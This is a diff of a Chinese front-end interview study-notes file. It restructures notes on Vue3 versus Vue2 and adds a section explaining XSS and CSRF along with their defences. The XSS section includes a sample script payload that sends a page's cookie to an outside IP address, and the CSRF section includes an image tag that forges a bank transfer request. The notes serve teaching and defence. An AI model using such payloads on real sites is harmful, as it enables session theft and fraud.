@@ -41,8 +41,7 @@
     https://blog.csdn.net/m0_58875326/article/details/124444419
   TCP协议的三次握手和四次挥手
     https://blog.csdn.net/weixin_73466540/article/details/131404800
-  vue和react的diff区别
-    https://juejin.cn/post/7318446267033452570?searchId=2024042311032731BCA887AA2E3692304D
+  
   TCP和UDP
     https://mp.weixin.qq.com/s?__biz=MzI5MjY4OTQ2Nw==&mid=2247486945&idx=3&sn=cd8cc3e300222a65346c1bb95fa30fb4&chksm=ec7cceb5db0b47a31ce071042e476015ac2374b36a2b1108ef4272aab04c4c95c09b281f1086&scene=178&cur_album_id=2968599106275246086#rd
     vue
@@ -175,21 +174,29 @@
       Object.defineProperty 无法监听到数组元素的变化，只能通过劫持重写数方法
       动态新增，删除对象属性无法拦截，只能用特定 set/delete API 代替
       不支持 Map、Set 等数据结构
-  Vue3
-      使用 Proxy 来监控数据的变化
-      Proxy 直接代理整个对象而非对象属性，这样只需做一层代理就可以监听同级结构下的所有属性变化
-      包括新增属性和删除属性
-      真正访问到的内部属性才会变成响应式，简单的可以说是按需实现响应式，减少性能消耗，不需要一上来就递归监听
-      可以监听数组的变化
-      支持Map，Set
 
 
-      更快的渲染速度：Vue3 的编译器生成的渲染函数比 Vue2 生成的更高效。
-      编译阶段：Vue 2.x 通过标记静态节点，优化 diff 的过程。Vue 3.x中标记和提升所有的静态节点，diff的时候只需要对比动态节点内容。
-      更小的体积：Vue3 将源码拆分为多个独立的模块，这样就可以按需导入所需的模块，从而减小了整个库的体积。
-      更好的 TypeScript 支持：Vue3 对 TypeScript 的支持更加友好，内部使用了更先进的 TypeScript 特性，并为其提供了更好的声明文件。
-      更好的组件系统：比如，Vue3中引入了一个新的 Fragment 组件，它可以替代原来的 template 标签作为根节点
-      新增了setup组合式API
+  Vue3相对Vue2的变化：
+
+      1.  使用 Proxy 来监控数据的变化
+          Proxy 直接代理整个对象而非对象属性，这样只需做一层代理就可以监听同级结构下的所有属性变化
+          包括新增属性和删除属性
+          真正访问到的内部属性才会变成响应式，简单的可以说是按需实现响应式，减少性能消耗，不需要一上来就递归监听
+          可以监听数组的变化
+          支持Map，Set
+      2.  新增了setup组合式API
+      3.  更快的渲染速度：Vue3 的编译器生成的渲染函数比 Vue2 生成的更高效。
+      4.  静态标记：优化 diff 的过程，Vue 3中标记和提升所有的静态节点，diff的时候只需要对比动态节点内容，静态内容直接复用
+      5.  更小的体积：Vue3 将源码拆分为多个独立的模块，这样就可以按需导入所需的模块，从而减小了整个库的体积。ESM更好的treeShaking
+      6.  更好的 TypeScript
+      7.  支持多个根节点
+      8.  新增Suspense组件(async setup  or defineAsyncComponents)
+      9.  新增Teleport组件，可以挂载到任何地方，to属性
+      10. v-if和v-for，v-if优先级高
+      11. 去掉了Filter过滤器
+      12. $set，$delete去掉
+      13. 去掉了$listeners，整合到$attrs上
+      14. $attrs包含class和style了
 
 
 
@@ -330,10 +337,47 @@
       self.postMessage('send data')              // self.postMessage()向主线程发送消息
       importScripts('script1.js')                // Worker 内部如果要加载其他脚本（不能加载外部文件），用 importScripts()
       self.close()                               // 用于在 Worker 内部关闭自身
+
+
+
+
+
+
+
+
+
+  XSS
+    XSS中文叫做跨站脚本攻击（Cross-site scripting）
+    恶意攻击者往 Web 页面里插入恶意可执行网页脚本代码，当用户浏览该页之时，嵌入其中脚本代码会被执行，达到盗取用户信息等目的
+    获取cookie:
+      1. 开发者没有对输入内容进行过滤
+      2. 输入框输入<script> new Image().src = "http://192.168.112.200/security/getxssinfo.php?url="%2blocation.href%2b"%26cookie="%2b document.cookie</ script>
+      3. 回显的时候直接执行，攻击者就拿到Cookie
+    预防：
+        1. 对html，script等标签特殊符号进行转义编码
+        2. HTTP-only Cookie: 禁止 JavaScript document.cookie 读取Cookie，后端：Set-Cookie: mycookie=myvalue; HttpOnly;
+
+  CSRF
+    CSRF(Cross Site Request Forgery)跨站请求伪造
+    CSRF攻击攻击原理：
+        1. 用户打开浏览器，访问受信任银行网站A（www.mybank.com），输入用户名和密码请求登录网站
+        2. 网站产生Cookie信息并返回给浏览器，此时用户登录网站成功
+        3. 用户未退出银行网站之前，在同一浏览器中，打开一个TAB页访问其他网站B
+        4. 网站B 已被黑客注入诱导信息，假如是一张图片，<img src=http://www.mybank.com/Transfer.php?toBankId=11&money=1000>
+        5. 然后访问危险站点B，这时你会发现你的银行账户少了1000块
+    预防：
+        1. 验证码
+        2. 使用Token，浏览器请求会自动携带cookie，但是不会携带token
+        3.验证请求头中的Referer 字段，记录了该 HTTP 请求的来源地址
+
+
+
 */
 
   </script>
 </html>
-<script></script>
+<script>
+
+</script>
 
 
